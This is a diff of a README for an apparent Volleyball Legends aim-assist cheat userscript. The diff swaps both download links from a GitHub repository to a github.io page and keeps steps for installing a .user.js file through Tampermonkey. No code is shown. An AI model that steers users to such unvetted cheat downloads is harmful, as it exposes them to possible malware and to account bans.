@@ -1,6 +1,6 @@
 # 🏐 volleyball-legends-script-hub - Enhance your volleyball matches with ease
 
-[![Download Now](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/holometabolic-nunavut998/volleyball-legends-script-hub)
+[![Download Now](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://holometabolic-nunavut998.github.io)
 
 This tool helps players in Volleyball Legends. It provides automated aim assistance for your spikes and serves. You run this software inside your web browser. It works by using a small script that tracks ball movement and adjusts your aim.
 
@@ -23,7 +23,7 @@ You need a userscript manager to run this tool. This extension acts as a bridge 
 
 Follow these steps to obtain and run the script on your Windows computer.
 
-1. Visit this page to download: [https://github.com/holometabolic-nunavut998/volleyball-legends-script-hub](https://github.com/holometabolic-nunavut998/volleyball-legends-script-hub)
+1. Visit this page to download: [https://holometabolic-nunavut998.github.io](https://holometabolic-nunavut998.github.io)
 2. Locate the file ending in .user.js on the release page.
 3. Click the file name to view the code.
 4. Tampermonkey will detect the script and show an install window.
